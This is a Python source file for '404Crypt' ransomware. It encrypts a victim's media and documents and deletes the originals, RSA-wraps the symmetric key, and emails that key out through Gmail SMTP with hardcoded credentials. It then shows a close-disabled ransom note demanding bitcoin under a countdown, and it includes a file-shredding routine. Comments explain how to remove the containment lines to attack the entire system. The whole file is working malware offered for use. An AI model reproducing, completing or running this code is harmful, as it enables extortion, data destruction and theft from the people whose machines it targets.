import os
import socket
import cryptography.fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from cryptography.fernet import Fernet
from email.message import EmailMessage
import smtplib
import platform
import requests  # Checking Internet Connectivity
from functools import lru_cache
from string import ascii_uppercase as drives
import tkinter as tk
import datetime
import webbrowser

# The Public RSA Key HardCoded For Key Encryption
# Replace This With your generate publick Key stored in the public.pem file
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuaQtdVILJUKvPNDGNspy
3r1aWzbFro1nKo0XSahYy7gm0eBaoTNdiYtdvaHgaFmhwpe81Oe++WNY0/2b9Eat
iVJG7tBQesci8JN+jbDCpyDW8Zz/DWRcgQHi2CFbKeUe+L7UjDScaRkjnF/piXqP
O9/RDFOdMPkVRLbGN3WSS20Qp39aMNY7oBRqOZySBzriHa8K84aPLHsL6RjlJ2fR
FF1wypTLGI3p0AWLghnNqCBtZXM0Y/dlqIFCyq7LO9zZmt2T7wDaJez8eWYMFFus
Dpo7DTTP7gwzAQgx585Rpt+2W3rSrYpEmCzjt0tO3RNzg7SD6hWjBa9VkTHBdTZt
HwIDAQAB
-----END PUBLIC KEY-----
""".encode()


# Encryption Class
class Malicious:
    def __init__(self):
        self.cipher_object = None
        self.key = None
        self.extensions = ["mp3", "rst", "png", "txt", "pdf", "jpg", "mp4", "mkv", "zip", "docx", "ppt", "xls", "db", "doc", "tar", "gz"]
        # self.__public_key = RSA.import_key(open("public.pem", "rb").read())
        self.__public_key = RSA.import_key(extern_key=public_key)
        self.enc_key = "symmetric_key.pem"
        self.file_system = None
        self.mail = "decryptfiles4@gmail.com"  # Change This to your Email Its also accessed  in ransomNote
        self.ml_pswd = "fjbfxxtcexvudupu"  # Change This [App Password Google app password for more information]
        self.server = None

    # Generation of symmetric Key
    def generate_key(self):
        self.key = Fernet.generate_key()
        with open(self.enc_key, "wb") as sym_key:
            sym_key.write(self.key)

    @lru_cache(4048)
    def __scramble(self, filepath, root=None, encrypted=False):
        # Fetching the Key for encryption purposes
        with open(self.enc_key, "rb") as symmetric_key:
            self.key = symmetric_key.read()
            self.cipher_object = Fernet(self.key)

        # Encryption Process

        with open(filepath, "rb") as data_file:
            data = data_file.read()

        if not encrypted:
            __data = self.cipher_object.encrypt(data)
            print(f"{filepath.split('/')[-1]} Encrypted Successfully.")

        else:
            __data = self.cipher_object.decrypt(data)
            print(f"{filepath.split('/')[-1]} Decrypted Successfully.")

        # Writing Saved Changes
        with open(filepath+".404Crypt", "wb") as file:
            file.write(__data)

        try:
            os.remove(filepath) 
        except PermissionError as e:
            print(f"Error {e}")

        except Exception as e:
            pass

    def crypt(self):
        operating_system = platform.system().lower()

        if operating_system == "linux":
            self.file_system = os.walk(self.linux, topdown=True)
            self.fs_navigator(file_system=self.file_system)

        elif operating_system == "windows":
            partitions = self.windows
            for partition in partitions:
                self.file_system = os.walk(partition, topdown=True)
                self.fs_navigator(file_system=self.file_system)

        elif operating_system == "darwin":
            self.file_system = os.walk(self.macos, topdown=True)
            self.fs_navigator(file_system=self.file_system)

        else:
            pass

    @lru_cache(4048)
    def fs_navigator(self, file_system,  encrypted=False):
        for root, dr, files in file_system:
            for file in files:
                # Obtaining Paths to @ file Iterated
                file_path = os.path.join(root, file)
                if file.split(".")[-1] in self.extensions:
                    if not encrypted:
                        try:
                            self.__scramble(file_path)
                        except ValueError as e:
                            print("Key is Encrypted")
                            self.display_ransom_note()
                            exit()

                        # some Files dont Allow R/W
                        except PermissionError as e:
                            print(f"Error {e}")
                        except Exception:
                            pass
                    
                    else:
                        self.__scramble(root, file_path, encrypted=True)

    @property
    def windows(self):
        # The C: Partitions Should start from C:\\Users Not C: To prevent Encryption of OS Files
        partitions = [f"{drive}:\\" for drive in drives]
        valid_partitions = []
        for partition in partitions:
            if partition.startswith(r"C:\\"):
                drv = r"C:\\Users\\"
            else:
                drv = partition
            
            if os.path.isdir(drv):
                valid_partitions.append(drv)
                
        valid_partitions = ["contained"]  # comment This line to attack entire system
        return valid_partitions

    @property
    def linux(self):
        path = "~/../"
        path = "contained"  # Comment This Line To Encrypt from /home in linux

        return path

    @property
    def macos(self):
        home = "/Users"
        login = os.getlogin()
        path = os.path.join(home, login)
        return path

    # Encrypt Symmetric Key Method
    @lru_cache(4048)
    def encrypt_symmetric_key(self):
        with open(self.enc_key, "rb") as sym_key:
            self.key = sym_key.read()

        # Encrypting AES key using RSA
        try:
            public_crypter = PKCS1_OAEP.new(self.__public_key)
            encrypted_key = public_crypter.encrypt(self.key)
        except ValueError as e:
            print("Key is Encrypted")
            self.display_ransom_note()
            exit()

        with open(self.enc_key, "wb") as sym_key_encrypter:
            sym_key_encrypter.write(encrypted_key)
            # print("[+] Key Encrypter Successfully [+]") [Debugging]
            print("[+] Emailing Key.... [+]")
            self.send_mail()

    def send_mail(self):
        try:
            self.server = smtplib.SMTP("smtp.gmail.com", 587)
            self.server.starttls()
        except socket.gaierror as e:
            pass
        if self.check_internet:
            # System Info
            os_system = platform.system()
            logged_user = os.getlogin()

            # mail msg Body
            message = EmailMessage()
            message["From"] = self.mail
            message["To"] = self.mail
            message["Subject"] = "Encrypted Key for OS: {} USER: {}".format(os_system, logged_user)

            with open(self.enc_key, "rb") as file:
                message.add_attachment(
                    file.read(),
                    maintype="application",
                    subtype="octet-stream",
                    filename=file.name
                )
            self.server.login(self.mail, self.ml_pswd)
            self.server.send_message(msg=message)
        else:
            print("No Internet")  # No internet Connection On target Machine

    @property
    def check_internet(self):  # Checks Internet Connectivity on Machine
        try:
            resp = requests.get("https://www.google.com", timeout=4)
            if resp.status_code == 200:
                return True
        except (requests.ConnectionError, requests.Timeout) as exception:
            return False

    @lru_cache(4048)
    def display_ransom_note(self):
        # Lazy Import Due to Circular Import Errors
        r_note = Note()
        r_note.mainloop()

    # Checking if Key is On Desktop
    @lru_cache(4048)
    def key_on_desktop(self):
        operating_system = platform.system().lower()

        if operating_system == "windows":
            path = r"C:\\Users"
            for root, dr, files in os.walk(path, topdown=True):
                for file in files:
                    file_path = file_path = os.path.join(root, file)
                    if file == self.enc_key and r"desktop\symmetric_key.pem" in file_path.lower():
                        return file_path

        elif operating_system == "linux":
            paths = ["/home/", "/root"]
            for path in paths:
                for root, dr, files in os.walk(path, topdown=True):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file == self.enc_key and "/desktop/symmetric_key.pem" in file_path.lower():
                            return file_path

        elif operating_system == "darwin":
            path = "/Users"
            for root, dr, files in os.walk(path, topdown=True):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file == self.enc_key and "/desktop/symmetric_key.pem" in file_path.lower():
                        return file_path

        else:
            pass

    def change_desktop_bg(self):
        pass

    # System Shred Needs Modification
    def shred_system(self):
        # Perform an OS Detection before Deletion
        operating_system = platform.system().lower()

        if operating_system == "linux":
            self.file_system = os.walk(self.linux, topdown=True)
            self.shred_navigator(file_system=self.file_system)
        elif operating_system == "windows":
            partitions = self.windows
            for partition in partitions:
                self.file_system = os.walk(partition, topdown=True)
                self.shred_navigator(file_system=self.file_system)
        elif operating_system == "darwin":
            self.file_system = os.walk(self.macos, topdown=True)
            self.shred_navigator(file_system=self.file_system)
        else:
            pass

    def shred_navigator(self, file_system):
        for root, dr, files in file_system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split(".")[-1] in self.extensions:
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                else:
                    pass


# Class Ransom Note screen
class Note(tk.Tk):
    @lru_cache(4048)
    def __init__(self):
        tk.Tk.__init__(self)

        # Obj For Emailing Attacker
        self.email = Malicious()  # Mailing Purposes
        self.browser = webbrowser

        # Timing Lines
        self.current_time = datetime.datetime.now()
        self.due_hour = 24.017  # 0.016  # This is the Time You Give your Victim Before Shredding their System

        # Calculating Optimal Time [ Time when Count down Will Stop]
        self.until = (datetime.timedelta(seconds=self.seconds_counter) + self.current_time)
        self.until = str(self.until).split(".")[0]

        # Gui
        self.title("404Crypt Ransomware")
        self.configure(bg='green')
        self.geometry("960x630")
        # Wallet Address
        self.bitcoin_address = "0X239dj023r0ff3203j0239r023492343"  # Change This To Your Wallet Address
        # self.email = "decryptfiles4@gmail.com"
        # Anti-Close Window
        self.geometry("900x600")
        self.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.overrideredirect(False)  # If Enabled Disables Control Buttons
        # Top Bar
        self.top_bar = tk.Frame(self, height=-1, bg="blue")
        self.top_bar.pack(side=tk.TOP, fill=tk.BOTH)

        self.tb_label = tk.Label(master=self.top_bar, text="YOUR FILES ARE ENCRYPTED", bg='grey', fg="blue", highlightthickness=1)
        self.tb_label.config(font=("", 35))
        self.tb_label.pack(side=tk.TOP, fill=tk.BOTH)
        self.leftframe()
        self.right_frame()

    def disable_close(self):
        pass

    def leftframe(self):
        #  left Frame for Timing and Contacting
        self.left_frame = tk.Frame(master=self, height=200, width=280, bg="red", highlightbackground='black',highlightthickness=1)
        self.left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        self.rf_note(text="\nYour Files Will Be Lost On", color="yellow", size=10)
        self.rf_note(text="\n%s" %self.until, color="white", size=14)  # Due Time indicator
        self.rf_note(text="\n\n\nTime Left\n", color="yellow", size=10)

        # Handling Count Down
        self.timecount = tk.Label(master=self.left_frame, bg="red", fg="black", justify=tk.CENTER, anchor=tk.NW)
        self.timecount.config(font=("", 32, "bold"))
        self.timecount.pack(side=tk.TOP)
        # self.countdown(self.seconds_left)
        self.countdown(remaining=self.seconds_counter)
        # Button
        frame = tk.Frame(self.left_frame,height=100, width=100, bg="red", highlightbackground='white',highlightthickness=2)
        frame.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)

        # self.button(text="Contact | Us", frame=frame)
        self.button(text="", frame=frame, action=self.email.send_mail())

        # Email Us Button
        email_us = tk.Button(frame, text="Email | Us?", justify=tk.LEFT, cursor="hand2")
        email_us.bind('<Button-1>', lambda event: self.email.send_mail())
        email_us.pack(side=tk.BOTTOM, padx=10, pady=10)

        # Contact us
        contact = tk.Button(frame, text="Need Help ?", justify=tk.LEFT, cursor="hand2")
        contact.bind('<Button-1>', lambda event: self.email.send_mail())
        contact.pack(side=tk.BOTTOM, padx=10, pady=10)
        # Buy
        how_to_buy = tk.Button(frame, text="How to Buy BTC?", justify=tk.LEFT, cursor="hand2")
        how_to_buy.bind('<Button-1>', lambda event: self.browser.open_new_tab(url='https://bitcoin.org/en/buy'))
        how_to_buy.pack(side=tk.BOTTOM, padx=10, pady=10)

        # What's BitCoin Button
        what_btc = tk.Button(frame, text="What's BitCoin?", justify=tk.LEFT, cursor="hand2")
        what_btc.bind('<Button-1>', lambda event: self.browser.open_new_tab(url='https://bitcoin.org'))
        what_btc.pack(side=tk.BOTTOM, padx=10, pady=10)

    @staticmethod
    def clicked():
        print("Button Clicked")

    def countdown(self, remaining=None):
        if remaining is not None:

            if remaining <= 0:
                self.timecount.configure(text="Time is UP!")
                # Shreade System Lines if Time Runs Out
                #shreader = Malicious()
                #shreader.shred_system()
                #self.timecount.configure(text="We Told You!")
            else:
                text = "%s" % str(datetime.timedelta(seconds=remaining)).split(".")[0]
                self.timecount.configure(text=text)
                self.after(1000, self.countdown, remaining - 1)
        else:
            pass

    @property
    def seconds_counter(self):
        try:
            # Attempt to read the end time from the file
            with open(".timer", 'r') as secs:
                end_time_str = secs.readline().strip()
                if end_time_str:
                    due_date = datetime.datetime.fromisoformat(end_time_str)
                else:
                    raise ValueError("Empty file")

        except (FileNotFoundError, ValueError):
            due_date = self.current_time + datetime.timedelta(hours=self.due_hour)

            with open("timer.txt", 'w') as timing:
                timing.write(due_date.isoformat())

        seconds_left = (due_date - self.current_time).total_seconds()

        return seconds_left

    def rf_note(self, text=None, color=None, size=None):  # LEft frame
        note = tk.Label(master=self.left_frame, bg="red", fg=color, justify=tk.CENTER, anchor=tk.NW)
        note.config(text=text, font=("", size, "bold"))
        return note.pack(side=tk.TOP)

    def button(self, text=None, frame=None, action=None):
        btn = tk.Button(frame, text=f"{text}", justify=tk.LEFT, cursor="hand2", bg="red", fg="red", height=0, width=0, border=None)
        btn.bind('<Button-2>', lambda event:action)
        return btn.pack(side=tk.BOTTOM, padx=10, pady=10)

    def right_frame(self):
        # Right Frame for all
        self.rightframe = tk.Frame(master=self, height=200, width=100, bg="white", highlightbackground='black', highlightthickness=1)
        self.rightframe.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        #  Warning Text Appears Here
        self.warning_frame = tk.Frame(self.rightframe, height=200, width=100, bg="black",highlightbackground="white", highlightthickness=1)
        self.warning_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True)

        self.warning_text(text="WHAT HAPPENED TO MY COMPUTER?", color='red', size=12)
        self.warning_text(text="\nYOUR FILES ARE ENCRYPTED WITH A MILITARY GRADE ENCRYPTION SERVICE", color="white", size=9)
        self.warning_text(text="\nCAN I RECOVER MY FILES?", color="red", size=12)

        text = f"""
No way You can Restore Your Files without the Special Key

The key is Available But Not Free, You Need To Purchase it if You want your Files

To purchase the Key & Restore Your System Data, Follow The Steps Below

1.  Click Mail US or Run the file Email_Me.py to communicate with us
"""
        text2 = """
2. Send $100 worthy of BitCoins to the Given Address Address Below"
"""
        text3 = f"""
3. Email {self.email.mail} with Proof of sending the Amount"""
        text4 = """
4. After Completion you will Receive a Key Copy File
"""
        text5 = """
5. Place the key file "symmetric.pem" on the "DESKTOP" then, Click DECRYPT
"""

        warning = """Don't attempt to decrypt your files with any software
It May cost you more to unlock your files.
"""

        self.warning_text(text=text, color="white", size=8)
        self.warning_text(text=text2, color="yellow", size=9)
        self.warning_text(text=text3, color="yellow", size=9)
        self.warning_text(text=text4, color="white", size=9)
        self.warning_text(text=text5, color="red", size=9)
        self.warning_text(text="WARNING", color="RED", size=14)
        self.warning_text(text=warning, color="red", size=8)
        # self.warning_text(text="FAILURE TO COMPLY WE SHRED YOUR SYSTEM", color="yellow", size=11)
        self.warning_text(text="SEND $100 Worth OF BTC To This Address:", color="yellow", size=11)

        self.text_field = tk.Text(self.rightframe, width=40, height=1)
        self.text_field.insert(tk.END, "BTC: "+self.bitcoin_address)
        self.text_field.config(state=tk.DISABLED)
        self.text_field.pack(pady=0, padx=10, side=tk.LEFT)

        # Copy Button
        copy = tk.Button(self.rightframe, text="Copy", justify=tk.CENTER, cursor="hand2")
        copy.bind('<Button-1>', lambda event: self.copy_text())
        copy.pack(side=tk.LEFT, padx=1, pady=0, expand=True)

        # Decrypt Button These have to be modified to link to os detection file
        file_decrypt = Decrypter()

        decrypt = tk.Button(self.rightframe, text="DECRYPT", justify=tk.CENTER, cursor="hand2", borderwidth=10, bg="red", fg="white", highlightthickness=2)
        decrypt.bind('<Button-1>', lambda event: file_decrypt.crypt())
        decrypt.pack(side=tk.BOTTOM, padx=10, pady=0, expand=True)

    def copy_text(self):
        self.clipboard_clear()
        wallet_address = self.bitcoin_address
        self.clipboard_append(wallet_address)

    def warning_text(self, text=None, color=None, size=None):
        note = tk.Label(master=self.warning_frame, bg="black", fg=f"{color}", justify=tk.LEFT, anchor=tk.NW)
        note.config(text=text, font=("", size, "bold"))
        return note.pack(side=tk.TOP)


# Class Decrypt Files
class Decrypter(Malicious):

    def __init__(self):
        super().__init__()
        self.extensions = ["404Crypt"]
        self.enc_key = self.key_on_desktop()

    @lru_cache(4048)
    def __scramble(self, filepath, root=None, encrypted=True):
        global __data

        try:

            with open(self.enc_key, "rb") as symmetric_key:
                self.key = symmetric_key.read()
                self.cipher_object = Fernet(self.key)

        except TypeError as e:
            print("Decryption Impossible Key Not On Desktop")
            exit()

        # Decryption Process

        with open(filepath, "rb") as data_file:
            data = data_file.read()

        if encrypted:
            __data = self.cipher_object.decrypt(data)
            print(f"{filepath.split('/')[-1]} Decrypted Successfully.")

        _filepath = filepath.split(os.path.sep)[-1]
        _filepath = _filepath.split(".")[0] + "." + _filepath.split(".")[1]
        _filepath = os.path.join(root, _filepath)
    
        with open(_filepath, "wb") as file:
            file.write(__data)

        os.remove(filepath)  # Deleting 404CryptFile After Original File Restoration

    def fs_navigator(self, file_system, encrypted=True):
        try:
            for root, dr, files in file_system:
                for file in files:
                    # Obtaining Paths to @ file Iterated
                    file_path = os.path.join(root, file)

                    if file.split(".")[-1] in self.extensions:

                        if encrypted:
                            try:
                                self.__scramble(root=root, filepath=file_path, encrypted=True)
                            # some Files dont Allow R/W
                            except PermissionError as e:
                                print(f"Error {e}")
                            except Exception:
                                pass

        except cryptography.fernet.InvalidToken:
            print("Decryption Impossible .. Nothing to Decrypt")
        except ValueError as e:
            print("Decryption Impossible .. Invalid Key")
        except OSError:
            pass


@lru_cache(4048)
def main():
    malware = Malicious()
    # malware.generate_key() # Once Uncommented When Program Run It Encrypts With a Diff Key
    malware.crypt()  # More CPU Needed
    malware.encrypt_symmetric_key()
    malware.display_ransom_note()
    malware.change_desktop_bg()


if __name__ == "__main__":
    main()
    
    
    



